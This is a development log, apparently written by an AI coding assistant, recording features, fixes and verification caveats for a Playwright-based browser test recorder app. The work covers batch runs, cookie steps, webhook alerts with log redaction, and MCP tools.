**Measured, then corrected course (`698e692` … `7dc8d6b`):** adding coverage reporting (`npm run test:coverage`) contradicted an assertion I had made — that the remaining components were "small enough that a test would mostly restate the JSX". They were not: `visual-view.tsx` (1,409 lines) and `settings-view.tsx` (1,015) sat at 0%, plus `add-step-dialog` (538), `recorder-store` (450) and `library-sidebar` (388). Covering `recorder-store`, `settings-view` and `visual-view` took the suite to **321 Vitest tests** and coverage from 22% → 27%.

**Coverage caveat:** it instruments the Vitest run ONLY, so the 15 standalone `check:*` scripts contribute nothing — `mcp/` reads 0% despite `check:mcp-select`. Treat per-file figures for anything a check exercises as a floor.

**What deliberately isn't tested, with reasons** (so nobody "fixes" these gaps by writing tests that assert their own fixtures): choosing a value in an SDK `Select` — it's backed by a NATIVE menu, so its options never enter the DOM; the image panes and drag overlays in `visual-view` — jsdom has no layout and decodes no images; `playwright-runner` — subprocess-bound and largely unexported, so testing it properly means refactoring it for testability first.

**Where the testing effort stopped, and why:** `playwright-runner` (subprocess-bound and largely unexported — testing it properly means refactoring it for testability, a bigger call than a test-writing pass) and ~18 small presentational components where a test would mostly restate the JSX. The bug-per-test ratio fell off sharply after the Auto-Heal / `describeStep` / `llm-service` batches; that is the honest reason to stop rather than an exhaustion of ideas.

**Totals at this point:** 113 Vitest tests across 5 files + the 15 standalone checks, all green via `npm run test:all`.

### 2026-08-04 — Paginate the Stats lists; reset a custom batch order

**Goal:** Show at most 50 log entries and paginate the rest. (Commits `d62914b`, `84aace6`.)

**Scope decision (asked, not assumed):** "log entries" could have meant the Stats run-history table, the raw-log search results, or the trainer's Console log lines — three different components. The user picked the two **Stats** lists; the trainer Console is deliberately still unbounded, and `paginate.ts` will drop straight in if it ever needs it.

**What was done:** both Stats lists render 50 rows behind a shared `Pager`, with the rules in `renderer/lib/paginate.ts`.

**Key decisions:** paging fails as "my data disappeared" rather than as an error, so the two pinned cases are an empty list reading "page 1 of 1" (never "of 0") and a page number outliving its list (clamp to real rows, don't render an empty table). `check:paginate` also stitches all pages of a 412-item list back together to prove pages cover every item exactly once in order — the assertion that catches an off-by-one in the slice bounds, which is how paging silently drops a row. The run-history heading still reports "N of M" for filtering while the pager reports the range within it, so they read as filter-then-page rather than competing counts.

**Follow-up (`84aace6`):** drag-to-reorder had shipped as a one-way door — no way back to library order. Added "Reset order", shown only when a custom order is actually in effect. Reset clears the stored order and lets the existing drift effect rewrite library order, so one code path produces the default rather than two.

**Review pass, no defects found:** checked whether the Batch view could show hidden tests (it can't — `testStore.list()` filters them, and the MCP path has its own filter, so the two agree) and whether concurrent settings writes could clobber `batchOrder` (they can't — `set()` re-reads from disk and merges per call, with no cache).

**NOT yet verified in the running app.**

### 2026-08-04 — Drag to reorder batch runs

**Goal:** The Batch view ran tests in library order with no way to change it, which matters as soon as tests depend on each other (log in, then check out). (Commit `eb058b7`.)

**What was done:** drag handles on the Batch rows (reusing the trainer step list's pattern — grip on hover, only the handle draggable so row clicks still work, accent line on the drop target), a user order persisted as `RecorderSettings.batchOrder`, and pure rules in `renderer/lib/batch-order.ts`.

**Key decisions:**
- **Persisted, not ephemeral.** A suite order is worth keeping across restarts, so it's stored — as ids, which means it drifts from the library constantly. `applyOrder` therefore guarantees every test appears exactly once (a test missing from the list would be unrunnable AND invisible), puts new tests at the END rather than reshuffling a curated suite, ignores deleted ids, and de-dupes a corrupt stored order. The stored order is rewritten once when the library drifts, not on every render.
- **Reorder by ID, not index.** A tag filter makes the visible rows a subsequence of the real order, so a visible index would move the wrong test.
- **The drag-down off-by-one.** After splicing the dragged id out, everything below shifts up one — `moveToTarget` recomputes the target position post-removal or dragging downward lands one short of the row you dropped on.
- **`selectedIds` derives from the ordered list**, not the library. This is the line that makes the feature real rather than cosmetic — it's what the batch actually runs, and getting it wrong would have shipped a UI that reorders rows while running in the old order.

**Verification:** `check:batch-order` (36 assertions) covering the drift rules, the every-test-exactly-once invariant, the off-by-one, and that a filtered drag moves correctly in the global order while hidden tests keep their relative positions. All sixteen checks + build green.

**NOT yet verified in the running app.**

### 2026-08-04 — Collapsible sidebar

**Goal:** Make the sidebar collapsible. (Commit `e785a1f`.)

**What was done:** mounted `<SplitView.SidebarToggle />` in `root-view.tsx`. The SDK's `SplitView` already implements collapse — animated collapse, persistence alongside `storageKey`, and the ⌃⌘S shortcut, which is wired ONLY when a matching toggle is mounted — so this was a one-line mount, not new logic. **Check the SDK before building UI behavior here.**

**Key decision:** left **pinned** (the default), which portals the button to a fixed anchor on the frame's leading edge so it stays put whether the sidebar is open or collapsed. The SDK docs call out the trap explicitly: a non-pinned toggle placed in `Sidebar.actions` disappears along with the sidebar when it collapses, leaving the keyboard shortcut as the only way back. Collapse state persists through the existing `storageKey="recorder"`.

**NOT yet verified in the running app** — worth confirming the toggle sits sensibly relative to the macOS traffic lights (the SDK applies a window-control inset to the leftmost column, which is exactly where this could look wrong), that ⌃⌘S works, and that the collapsed state survives a relaunch.

### 2026-08-04 — Cookie management in the trainer

**Goal:** While training a new test or editing an existing one, be able to create, update and delete cookies. (Commits `d2bc4db`, `01e7a99`, `f1309ba`.)

**Scope decision (asked, not assumed):** the request was ambiguous between a live-only setup tool and cookie state recorded into the test. The user chose **both** — edit the training browser live, and optionally record each change as a step so runs reproduce it. Live-only would have left the classic footgun (test passes in the trainer, fails on a run, nothing pointing at the missing cookie); always-recording would bake expiring auth tokens into committed specs. Hence the default-ON but opt-out "Add to test as a step" checkbox.

**What was done:** a `cookie` step type (action `set`/`delete`/`clearAll` + `CookieSpec`) that generates `page.context().addCookies([...])` / `clearCookies(...)` and round-trips through the parser; `cookie-service.ts` over `webContents.session.cookies`; a Cookies tab in the trainer's bottom panel.

**Key decisions / traps:**
- **Session API, not `document.cookie`.** httpOnly cookies are invisible to page JS by definition, and `document.cookie` can't set Domain/Secure/SameSite faithfully. This also forces cookie steps out of the injected-script replay path.
- **One replay dispatch point.** Rather than special-casing four replay methods, all four now go through `runStep`. This is a direct response to the Auto-Heal bug earlier in the session, which was exactly the shape of "wired into one path, missing from three".
- **Two vocabulary mismatches, both silent when wrong.** Chromium's `expirationDate` (unix seconds) is Playwright's `expires`; Chromium's `no_restriction`/`lax`/`strict` are Playwright's `None`/`Lax`/`Strict`. A mis-mapped sameSite yields a cookie the site won't send on navigation — a confusing auth failure, not an error. Centralized in `types.ts` with inverses.
- **URL reconstruction.** `cookies.set`/`remove` need a URL but cookies are stored as domain+path. Chromium's leading dot on a domain cookie (`.example.com`) is not a hostname; a URL built with it silently targets nothing. Secure cookies need `https`.
- **Refuse to emit a broken line.** A `set` step Playwright would reject (no url, no domain+path) emits NO line — a call that fails during setup is more confusing than a missing step. Likewise `clearCookies({domain})` is not read back as a per-cookie delete; it's counted as skipped, feeding `stepsDiverged`.
- `RawStep` needed the cookie fields too — `insertStep` spreads a RawStep and would otherwise drop them silently.

**Follow-up fixes from a review pass (commit `267a62c`):** (1) the panel showed and preserved an expiry but had **no way to set one**, so every cookie created through the UI was silently a session cookie despite the whole stack supporting `expirationDate` — added a "Session" checkbox revealing a datetime-local field. The conversions live in `renderer/lib/cookie-format.ts` because both directions have a trap: `expirationDate` is unix SECONDS (not ms), and a datetime-local input reads/writes LOCAL time with no timezone suffix, so building it from `toISOString()` shows the wrong time to anyone off UTC. Asserted as round trips so the check is timezone-independent. (2) `runStep` asserted the recorder window was alive (`recWindow!`) when applying a cookie step, though the surrounding replay loops explicitly guard for the window closing mid-run — it could throw a TypeError out of a replay instead of failing that step cleanly.

**Third review finding (commit `4800716`) — a pre-existing bug the new step type exposed:** `buildReplay`'s failure fallback ("when a capture run failed but nothing REPORTED a failure, blame the first step after the last screenshot") excluded only `if`/`endif`. A cookie step produces no screenshot, so it was blamed — and every step after it was then marked `skipped` despite having run, so the real failing click showed as skipped while a cookie set that succeeded showed as failed. The candidate is now `captureMethod(s) !== null`, i.e. only steps that WOULD have captured. Fixed by capture semantics rather than a type blocklist, since **any** future non-capturing step type would have hit the same thing. A genuinely failing cookie step is still surfaced (the reporter reports it, and `reportedFail` wins above that branch). Pinned in `check:visual-pipeline`.

**Verification:** `check:cookie-steps` (78 assertions) covering both sameSite directions, scope validation, generation, a full step → spec → step round trip (incl. quote/backslash values and multi-cookie calls), and URL reconstruction. All fifteen checks + build green.

**Process note:** a first commit went in with a lint failure because the verification command piped `npm run lint` into `head`, so the pipeline's exit status came from `head` and the `&&` chain continued past a real error. **Don't pipe verification commands into `head`/`tail`** — check the exit code, or run them bare.

**NOT yet verified in the running app:** the Cookies tab has never been rendered. Needs a Glaze pass — see the test-instruction format used for the previous UI verification.

### 2026-08-04 — UI verification pass in the Glaze app

**Goal:** Five UI surfaces had been built from the Claude Code CLI, which cannot launch the native shell — so none of them had ever been rendered. This was the largest accumulated risk in the work.

**Scope:** a 35-check script covering (A) the per-test/global browser picker and cross-browser runs, (B) Stats run-history filtering, (C) batch runs incl. sequential execution, stop, restart-restore and interrupted-batch recovery, (D) test tags incl. case-insensitive grouping and selection surviving filter switches, and (E) webhook alerts incl. the disabled-until-configured switch and the no-logs-in-payload guarantee.

**Result:** the user reported back that everything looked good — all five surfaces render and behave as intended, with no defects raised.

**How this was recorded — read this before relying on it:** the reply was a **summary confirmation ("everything looks good"), not the itemized per-check results block** that was requested. So the accurate statement is "a UI pass was performed and nothing was reported wrong", NOT "each of the 35 checks was individually observed and confirmed". Four checks were called out beforehand as the most likely to surface problems and are the ones to re-test first if anything later looks off: **B2** (filters must not change the Stats summary cards / chart), **C8** (force-quit mid-batch → the batch shows Stopped with interrupted tests Skipped, not stuck "Running"), **D4** (tag-filter switches must not silently deselect tests), and **E4** (the webhook payload must contain no run-log output — verified in code by `check:alerts`, and this was its first observation on the wire from a real run).

**Consequence:** commits `c4a8326` … `6b61d2d` are now considered UI-verified. The standing caveat on those entries ("has not been seen rendered") no longer applies.

### 2026-08-04 — Webhook alerts (the first outbound data path)

**Goal:** Run notifications were macOS-local only, so there was no way to hear about a failure without the app in front of you. This was the last deferred item on the reconstructed backlog, and the only one that had been left pending a decision about run data leaving the machine. (Commit `47b6379`.)

**Key decision — the channel:** a generic outgoing webhook rather than a Slack app or email. It covers Slack and Discord (both accept an incoming-webhook URL) without the credential storage and delivery machinery SMTP would need, and it works with any HTTP endpoint.

**Key decisions — the safety constraints** (this is the ONLY thing in the app that sends data off the machine, so these are load-bearing, not decoration):
- Off by default, and the enable toggle is DISABLED until a URL is saved. Nothing leaves the machine otherwise.
- **Summary only.** Run logs are never sent — they routinely contain page content, URLs with session tokens, and values typed during recording (passwords, card numbers). What goes out: test name, status, the failing step's label, counts, duration, browser. `buildAlertPayload` is pure and is the only place that shape is defined, so the guarantee is enforceable rather than aspirational.
- Best-effort: slow/down/wrong webhooks are logged and swallowed (10s timeout). Reporting a problem must never become one.
- The URL is a **bearer credential**, not a setting — anyone holding a Slack webhook URL can post to that channel — so it's `safeStorage`-encrypted like the Anthropic key, backend-only, and never read back into the renderer. Settings shows only `{hasUrl, host}`. http(s) only, so a `file://` or `javascript:` URL can't reach fetch.
- A batch sends ONE alert for the suite; per-run alerts are suppressed for batched runs.

**Verification:** `check:alerts` (37 assertions) pins the redaction guarantee — planted secrets never reach the payload, the payload has exactly the documented keys with no passthrough, `detail` keys stay within a known-safe set — plus quiet-on-success and URL rejection (`file://`, `javascript:`, `ftp://`). Separately drove the real network path against a local HTTP server: correct JSON on the wire with `content-type: application/json`, non-2xx raised as an error, and the abort firing at 10s. `glaze-backend-stub.ts` gained a `safeStorage` stub that reports encryption as unavailable, so a check can never write a real secret to disk.

**Correction made during review:** the Settings copy originally claimed webhook alerts were "the only feature that sends anything off this Mac". That is false — Debug with AI on the Claude provider already sends the script and failing run output to Anthropic. Since a user could read the original wording and conclude their run logs never leave, the copy now says "the only thing that sends data off this Mac **automatically**" and names the Claude caveat explicitly.

**UI verified** in the Glaze app on 2026-08-04 (see the verification entry at the top of this section).

### 2026-08-04 — MCP `run_batch` + browser choice for `run_test`

**Goal:** The MCP server could only run one test at a time, so an external client had no way to ask "run my smoke tests" — the thing you most want from an agent driving a suite. Tags gave it a natural selector. (Commit `5d2d720`.)

**What was done:** New `run_batch` tool (select by `testIds` / `tag` / everything visible), selection logic extracted to the pure `mcp/select-tests.mjs`, and `run_test`/`run_batch` unified on one `executeTest()` helper so they can't drift in how they invoke Playwright or what they record. `run_test` gained a `browser` arg. `list_tests` now exposes `tags` + `runBrowser`. Batches are written to `batch-history.json` in the app's own shape, so an MCP-driven batch shows up in the app's Batch view.

**Key decisions:** Missing test ids are returned in `missingTestIds` rather than dropped — silently running 4 of 5 and reporting success is the worst failure mode for an agent with no eyes on the app. The response is flagged `isError` when any test failed, for the same reason. Hidden tests are excluded from tag/all selections (hiding is a sidebar concern) but honored when named explicitly by id.

**Two incidental fixes:** the server had the same `startsWith("chromium")` install-detection bug as the app, and `run_test` was ignoring each test's configured speed entirely (now passes `PW_SLOWMO_MS`). Both were one-line fixes in code already being restructured.

**Verification:** `check:mcp-select` (22 assertions) plus a real stdio JSON-RPC session against the running server — it registers all six tools with the expected schema, and `run_batch` against a non-matching tag returns the empty-selection error without touching run history. A real end-to-end batch was deliberately NOT executed from here: it would run browsers against live sites and write real records into the user's history.

### 2026-08-04 — Test tags + tag-filtered batch runs

**Goal:** The Batch view was a flat checklist over the whole library — fine for a dozen tests, unusable at a hundred. `TestRecord` had no suite/folder/tag field to group by. (Commit `8a0f77f`.)

**What was done:** Free-form `TestRecord.tags`, edited via the sidebar's right-click → **Edit Tags…** (`tags-dialog.tsx`), which also offers tags already in use as one-click toggles. The Batch view gained a tag chip row (with counts + **Untagged**) that filters the checklist. New `renderer/lib/test-tags.ts` for grouping, `normalizeTags` in `main/recorder/types.ts` for canonical form.

**Key decisions:** (1) **Normalization is backend-only** — the renderer posts raw strings and re-renders what comes back, so the two sides can't disagree; `normalizeTags` takes `unknown` because it sits directly behind IPC. (2) The dialog suggests existing tags because free-form tags rot fast when typing is the only affordance. (3) Selection is stored by test id and select-all/none act on the *visible* set only, so switching filters never drops what you already ticked — which is why those buttons add/remove rather than replace.

**Verification:** `check:test-tags` (30 assertions) covering hostile input, both caps, idempotence (repeated saves must not churn the record), and case-insensitive grouping so `smoke`/`Smoke` count as one tag.

### 2026-08-04 — Persisted batch results

**Goal:** Batch state lived only in memory: closing the app lost the summary, and although each test's run survived in `run-history.json`, nothing recorded that a set of runs belonged to one batch. (Commit `782d0a4`.)

**What was done:** New `batch-history-store.ts` + `RunRecord.batchId` as the join back to individual runs. `playwrightRunner.start` now also returns the `RunRecord` id, which the batch records per test, so a stored batch can link through to a run's log. The Batch view gained a "Previous batches" list (click to inspect, plus Clear history) and falls back to the most recent stored batch when nothing is live.

**Key decisions:** (1) **Write-through, not write-at-end** — persisting only on completion would lose everything to exactly the failure mode the feature exists to fix. The file is metadata-only and capped, so a full rewrite per transition is cheap. `save()` upserts by batchId; appending would leave dozens of records per batch. (2) Write-through created a new problem — a record persisted with `running: true` after a crash would show a phantom in-progress batch forever — hence `reconcileInterrupted()` at startup. (3) A separate index from run history, since a batch is a grouping over runs and the two prune on different rules.

**Corrections/Lessons Learned:** A type error (a spread overwriting an explicit property in the check file) passed a green `check:batch-history` because the esbuild-bundled checks don't type-check. **`npm run type-check` is the real gate for those checks** — a green check script alone is not sufficient.

### 2026-08-04 — Batch (suite) runs

**Goal:** Tests could only be run one at a time from the detail view — no way to run the library and get an aggregate result. (Commit `1beb8fc`.)

**What was done:** New `main/services/batch-runner.ts` + a `/batch` route (`renderer/main/batch-view.tsx`, sidebar → Views → Batch): pick any subset of tests, set batch-level headless/capture/browser options, run them back to back, watch per-test progress and a pass/fail summary. IPC `batch:run`/`batch:stop`/`batch:status` + push `batch:progress`/`batch:done`.

**Root obstacle:** `playwrightRunner.start` was fire-and-forget with no way to await a run, and the existing `runs` map can't serve as one — it holds an entry only while the child process is alive, so it is empty during browser install and again after exit but before the `RunRecord` is written. Awaiting it would have produced a batch that raced ahead of its own tests. Added a separate `inFlight` promise map + `waitFor(runId)` resolving to the exit code.

**Key decisions:** (1) **Strictly sequential** — the runner is keyed by testId so it *would* run several at once, but each run spawns its own Playwright process and browser (parallel contends for CPU and makes headed runs fight over the screen), and sequential keeps the per-run event stream unambiguous for a renderer that shows one live run. (2) **No new history** — each test still writes its own `RunRecord`, so a batch appears in Stats as ordinary runs. A useful consequence: opening a test's detail view mid-batch shows its live output, because `recorder-store.tsx` already falls back for unknown runIds. (3) **Batch options are not persisted per test** — a suite run is a one-off choice; writing it back would silently rewrite every test's saved preference.

**Edge cases pinned by `check:batch-runner` (38 assertions):** a test deleted after queueing is skipped (not fatal); a test already running is skipped rather than reported as a bogus failure; a failing test never aborts the batch; `stop()` kills the current run and skips the rest while keeping earlier results; only one batch at a time. Deps are injected so the queue is driven against a fake runner — including asserting runs never overlap via a concurrency high-water mark — with no browsers or child processes.

**Known limitation at the time (since FIXED — see the batch-persistence entry above):** batch state was in-memory only, so it did not survive an app restart, and nothing on `RunRecord` recorded that a set of runs belonged to one batch.

### 2026-08-04 — Cross-browser runs (Chromium / Firefox / WebKit)

**Goal:** Every run was hardcoded to Chromium, so cross-browser bugs — the main reason to own a browser test suite — were invisible. (Commit `00a9bdd`.)

**What was done:** A browser picker shaped like the existing "Run headless" preference: per-test `Select` in the test detail toolbar (persisted via new `tests:setBrowser`), a global `defaultRunBrowser` in Settings, and an explicit override on `runner:run`. The Playwright CLI's `--browser=<engine>` selects it. Stats surfaces the engine (Tags column names it with the headed/headless icon) and the tag filter gained an entry per engine; the former `"browser"` tag value was renamed `"headed"` now that "browser" is ambiguous.

**Real bug found while implementing:** `isBrowserInstalled` matched a bare `startsWith("chromium")`, but Playwright also unpacks a `chromium_headless_shell-*` directory alongside `chromium-*`. A headless-shell-only install was therefore reported as complete and the run failed at launch. Detection now matches the `<engine>-` prefix. (Both directories are present in a real install — verified against `userData/recorder/browsers/`.)

**Key decisions:** Resolution order is explicit → `TestRecord.runBrowser` → `RecorderSettings.defaultRunBrowser`. The engine name is validated (`isRunBrowser`) at both the settings-store and IPC boundaries — unvalidated input would be handed straight to the Playwright CLI. Runs predating this have no `runBrowser` and are reported as Chromium, which is what they ran on. The trainer is unaffected (it records in the app's own WebView).

**Verification:** a spec was run on all three engines through the same config and CLI args the runner builds — firefox/chromium/webkit each passed, and webkit failed as expected before installing, exercising the install path. NOTE: Firefox and WebKit are now downloaded into `userData/recorder/browsers/`, so the "first run on this browser" install message will not appear again unless a directory is deleted.

### 2026-08-04 — Filterable Stats run history

**Goal:** The run-history table was display-only; the Tags column had been noted as "eventually filterable, but not yet." (Commit `ea60932`.)

**What was done:** Three ANDed filter axes above the table (status / tag / test), client-side over the already-loaded run list — no extra IPC round trip. Predicate extracted to `renderer/lib/run-filters.ts` with `check:run-filters`.

**Key decisions:** Filters apply to the **table only** — the summary cards and pass/fail chart keep describing the whole history, so narrowing the table never silently redefines "pass rate". **Baseline-update rows are the subtle case:** their `status` field is incidental, so they are reachable only via status `baseline` and are excluded by every tag filter. Capture runs gained a camera icon in Tags, since capture is filterable and had no visible marker. A test filter pointing at a deleted/pruned test resets to "all" rather than showing an empty table.

### 2026-08-04 — Auto-Heal now runs in every replay path

**Goal:** Auto-Heal was invoked only from `replayFromCurrent`, so a locator that failed to resolve during a single-step preview (`replayStep`), a "replay from start", or the Edit-in-Trainer auto-run (`replayAll`) got no healing and no candidate menu. (Commit `c4a8326`.)

**What was done:** The engine, settings, IPC, and Console UI were all already built — three of the four call sites were simply missing. Factored the shared re-run wiring into `healAndRetry()` and called it from all four paths; structural `if` steps are excluded in the loop paths (no healable target).

**Key decisions:** Added `check:auto-heal-wiring`, a source-level check that slices each replay method out of `recorder-service.ts` and asserts it calls `healAndRetry` and acts on `okWithHeal`. Verified it actually fails when a call site is removed, rather than passing vacuously.

**Corrections/Lessons Learned:** This was found by auditing `.glaze_memory` prose against the code. Much of that prose was stale — several features described as "deferred to a later phase" (trainer AI step generation, component-level visual diffing, live replay) were already shipped, while this genuinely-missing wiring was documented as complete. **Verify every documented gap against the source tree before planning work from it.**

### 2026-08-04 — Fixed provider selection silently discarding "anthropic" (Claude)

**Goal:** When the user selected Claude as the AI provider in Settings, the backend still used Ollama — error messages and chat requests referenced "Ollama" instead of "Claude", even though the window header showed the Claude model name.

**Root cause:** `normalizeProvider` in `main/services/llm-config-store.ts` only recognized "lmstudio" and defaulted everything else to "ollama". When the renderer sent `provider: "anthropic"` via `api.llm.setConfig`, the backend silently stored `"provider": "ollama"` in the config file. The renderer displayed the user's selection from its own state (so the header showed "claude-sonnet-5"), but the backend always used Ollama for chat and status probes.

**What was done:** Updated `normalizeProvider` to accept "anthropic" as a valid provider and return it as-is. Also fixed a pre-existing `.at(-1)` type error in `main/services/__tests__/batch-runner.check.ts` (ES2020 lib doesn't include `Array.at`) by replacing it with index-based access.

**Key decisions:** The fix is a one-line change to the allowlist. Users who previously selected Claude need to re-select it in Settings once to save the correct provider.

### 2026-08-04 — Improved LLM error messaging + always-visible sidebar connection status

**Goal:** The AI debug panel and generate dialogs showed a bare "fetch failed" when the LLM provider was unreachable. The sidebar footer only showed connection status for local providers and only when connected (hidden when unreachable).

**What was done:** (1) Backend `llm-service.ts` `runChat` catch block now wraps connection failures ("fetch failed", ECONNREFUSED, timeout, etc.) with the same friendly message the `status()` probe produces — "Could not reach Ollama at http://127.0.0.1:11434. Make sure it is running." for local providers, "Could not reach Claude (https://api.anthropic.com). Check your internet connection and try again." for Anthropic. (2) The Anthropic `status()` catch block was also updated to wrap network errors instead of passing raw "fetch failed" through. (3) Extracted the duplicated `friendlyError` function from `ai-debug-panel.tsx`, `generate-steps-dialog.tsx`, and `generate-test-dialog.tsx` into a shared `renderer/lib/llm-errors.ts` module that also handles 401/invalid API key errors with a Settings hint. (4) Rewrote `AiConnectionFooter` in `library-sidebar.tsx` to always render (for all providers, local and cloud) with three states: green dot (connected), red dot (disconnected, with the backend's friendly error as tooltip), or loading dot (checking). Previously it returned `null` when unreachable.

**Key decisions:** Shared `friendlyError` in `renderer/lib/` avoids three copies of the same regex. The footer's tooltip shows the full error message while the visible label stays short (just the provider name).

**Goal:** The screenshot in the Visual diff view overflowed past the bottom border of its containing panel, especially for tall screenshots.

**What was done:** In `renderer/main/visual-view.tsx`, the `StepScreenshot` wrapper div changed from `relative max-h-full max-w-full` to `relative flex h-full w-full items-center justify-center overflow-hidden`. The old `max-h-full` on the wrapper didn't constrain the image because in a flex container with `items-center`, the wrapper's height was content-based (determined by the image), making the image's `max-h-full` resolve against its own natural height — circular. With `h-full`, the wrapper takes the full height of the bordered container, giving the image's `max-h-full` a definite value to resolve against. Added `overflow-hidden` to the bordered container (line 1113) as a safety net. The image keeps `object-contain` so it letterboxes within the constrained area.

**Key decisions:** `h-full w-full` on the wrapper (instead of `max-h-full max-w-full`) gives the image a definite parent height to constrain against. The wrapper itself is now a flex container that centers the image, replacing the parent's centering role for the image.

### 2026-08-04 — Fixed screenshot overflow in Visual diff view

**Goal:** The screenshot in the Visual diff view overflowed past the bottom border of its containing panel, especially for tall screenshots.

**What was done:** In `renderer/main/visual-view.tsx`, the `StepScreenshot` wrapper div changed from `relative max-h-full max-w-full` to `relative flex h-full w-full items-center justify-center overflow-hidden`. The old `max-h-full` on the wrapper didn't constrain the image because in a flex container with `items-center`, the wrapper's height was content-based (determined by the image), making the image's `max-h-full` resolve against its own natural height — circular. With `h-full`, the wrapper takes the full height of the bordered container, giving the image's `max-h-full` a definite value to resolve against. Added `overflow-hidden` to the bordered container (line 1113) as a safety net. The image keeps `object-contain` so it letterboxes within the constrained area.

**Key decisions:** `h-full w-full` on the wrapper (instead of `max-h-full max-w-full`) gives the image a definite parent height to constrain against. The wrapper itself is now a flex container that centers the image, replacing the parent's centering role for the image.

### 2026-08-04 — Verified five visual-testing pipeline changes + fixed ai-debug-scroll regression

**Goal:** Claude Code implemented five deferred visual-testing roadmap items (commits 35ea8c6, 83f06b1, edf0d6c, da79d4b, 1613463). All backend logic passed `check:visual-pipeline`, `check:retention`, and `check:capture-overhead`, but none of the new UI had been seen running. Also fix a pre-existing `check:ai-debug-scroll` regression from the earlier "move follow-up input above model output" commit (b18f39f), which dropped the `max-h-[56vh]` constraint from the review-phase ScrollArea.

**What was done:** (1) Fixed `check:ai-debug-scroll` — restored `max-h-[56vh]` + matching `viewportClassName="max-h-[56vh]"` on the review-phase ScrollArea in `ai-debug-panel.tsx` (line 617), bringing the constrained ScrollArea count back to 3. (2) Built and launched the app. (3) Verified in the running app: the Visual tab's "Ignore regions" button toggles a `cursor-crosshair` overlay (`MaskLayer`) over the screenshot; the "Apply to all steps" switch and "Done" button are present; the overlay is positioned as CSS percentages over the image box. The Page/Element `SegmentedControl` is correctly absent for steps whose baseline predates element geometry (goto/viewport/wait steps have no `step.rect`). The Stats view's "Capture overhead" panel is correctly hidden until an instrumented capture run exists. Settings shows "Delete screenshots older than" (0–365 days) below "Screenshot history per test" and "Notify when a run has problems" switch — both persist via `api.recorder.setSettings`. Backend `run-notifier.ts` uses the SDK `Notification` API, gated on `notifyOnRunIssues`, returns null for clean runs. `pruneRuns` excludes `baseline/` from both count and age rules.

**Key decisions:** The review-phase ScrollArea now uses `max-h-[56vh] flex-1 min-h-0` (both the flex sizing from the earlier move AND the max-height constraint for scrolling), with `viewportClassName="max-h-[56vh]"` matching. The `flex-1 min-h-0` lets it share space with the follow-up input above it; the `max-h-[56vh]` ensures it scrolls when the prompt is long.
**UI elements:** Visual tab (MaskLayer overlay, Ignore regions button, Apply to all steps switch, DiffBadge with SquareDashed icon, Page/Element SegmentedControl), Stats view (CaptureOverheadPanel), Settings (artifact-retention-days input, notify-run-issues switch), AI debug dialog (review-phase ScrollArea).
**Backend elements:** visual-diff.ts (diffPngBuffers masks + region), replay-builder.ts (element-scoped diffing + "predates" message), capture-fixture-source.ts (captureMs/shotCount/elementRect), artifact-store.ts (pruneRuns maxAgeMs), run-notifier.ts (Notification API), run-history-store.ts (CaptureOverheadSummary), recorder-settings-store.ts (artifactRetentionDays, notifyOnRunIssues), playwright-runner.ts (notifyRunOutcome call).
**Corrections/Lessons Learned:** The `check:ai-debug-scroll` regression was introduced by the earlier "move dialog above model output" change (b18f39f), which replaced `max-h-[56vh]` with `flex-1 min-h-0` on the review-phase ScrollArea — dropping below the check's minimum of 3 constrained ScrollAreas. The fix combines both: `max-h-[56vh] flex-1 min-h-0`.
**User Frustrations & Important Remarks:** User noted the horizontal overflow issue in the Stats table (separate fix applied in the previous task).

### 2026-08-04 — Stats run history table: truncate instead of horizontal scroll

**Goal:** The Stats view's run history table allowed horizontal scrolling when test names or dates were long. The user wanted overflowing fields truncated with the full value shown on hover instead.

**What was done:** In `renderer/main/stats-view.tsx`, the run history `Table` now uses `table-fixed` with explicit column widths (Test auto-fills, Status w-20, Started w-28, Tags w-24, Duration w-24, Log w-20). Added `sticky` to `TableHeader` so `Table` skips its built-in horizontal `ScrollArea` wrapper, and wrapped the table in `div.overflow-x-hidden` as a safety net. The "Test" and "Started" cells use `truncate` (ellipsis) with a `title` attribute for hover tooltips showing the full value. Removed the old `max-w-[220px]` on the Test cell (no longer needed with `table-fixed`).

**Key decisions:** `table-fixed` + explicit widths on the narrower columns lets the Test column flex to fill the remaining space, which is where truncation matters most. `title` attributes provide native hover tooltips without any custom tooltip component.
**UI elements:** Stats view run history table. **Backend elements:** none.
**Corrections/Lessons Learned:** None.

### 2026-08-04 — Moved AI debug follow-up input above the model output

**Goal:** In the AI debug dialog (`AiDebugDialog` in `renderer/main/ai-debug-panel.tsx`), the follow-up Textarea + Send button (shown when `status === "done"`) used to render BELOW the model output ScrollArea. The user wanted it moved ABOVE the model output, matching the review-phase layout where the "Anything else you want to include?" input sits above the prompt preview.

**What was done:** In the `!reviewing` branch of `AiDebugDialog`, moved the `{status === "done" && content ? (...) }` follow-up input block to BEFORE the model-output `ScrollArea` instead of after it. No logic changes — pure layout reorder.

**Key decisions:** Mirrors the review phase's input-above-output pattern so the dialog is consistent between the initial context field and the follow-up field.
**UI elements:** `AiDebugDialog` follow-up input row. **Backend elements:** none.
**Corrections/Lessons Learned:** None.

### 2026-08-04 — Added CLAUDE.md handoff doc for external Claude Code collaboration

**Goal:** Let the user's own Claude Code CLI help develop this app's source (separate from the earlier MCP server, which exposes app *data*, not app *code*, to AI tools).

**What was done:** Created `CLAUDE.md` at the repo root (tracked in git) — architecture overview, directory map, npm commands, hard constraints (protected dirs, forbidden imports, npmrc rules, no Xcode setup), SDK reference paths, and a "Working alongside the Glaze app" section explaining the dev loop (external session edits + runs lint/type-check/build; only the Glaze app can launch/live-preview; both share the same local-only git repo). Verified no CLAUDE.md, no git remote, and no prior `.claude/` config existed.

**Key decisions:** Kept the doc self-contained (no reference to Glaze-internal guides/tools external Claude can't access) but did include the public `@glaze/core` SDK reference paths since code correctness depends on them. Docs-only change — no build needed.
**UI elements:** none. **Backend elements:** none (documentation).
**Corrections/Lessons Learned:** None.

### 2026-08-04 — Added MCP server usage README

**Goal:** Document how to use the Good Looks MCP server (added earlier this session) so the user and other MCP clients know how to set it up and call its tools.

**What was done:** Wrote `mcp/README.md` — setup instructions for Claude Code (`claude mcp add`), Codex CLI (`~/.codex/config.toml`), and Claude Desktop/other clients (JSON config), plus a per-tool reference (`list_tests`, `get_test`, `list_runs`, `get_run_log`, `run_test`) with argument tables and example invocations, example natural-language prompts, and notes on read-only vs. mutating tools and data-dir portability.

**Key decisions:** Docs-only change, no app code touched — skipped the build step accordingly.
**UI elements:** none. **Backend elements:** none (documentation).
**Corrections/Lessons Learned:** None.

### 2026-08-04 — Added standalone MCP server exposing the test library

